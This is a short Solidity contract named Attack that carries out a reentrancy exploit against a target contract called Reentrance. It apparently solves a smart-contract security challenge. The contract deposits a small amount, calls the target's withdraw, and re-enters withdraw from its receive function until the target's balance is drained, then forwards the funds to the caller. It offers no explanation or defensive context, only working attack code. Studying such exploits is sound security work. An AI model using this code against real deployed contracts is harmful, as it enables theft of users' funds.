contract Attack {
  Reentrance target;

  constructor(address payable _target) {
    target = Reentrance(_target);
  }

  function donate() external payable {
    target.donate{value: msg.value}(address(this));
  }

  function attack() external {
    target.withdraw(0.001 ether);
  }

  receive() external payable {
    if (address(target).balance > 0) {
      target.withdraw(0.001 ether);
    }
  }

  function withdraw() external {
    msg.sender.call{value: address(this).balance}("");
  }
}s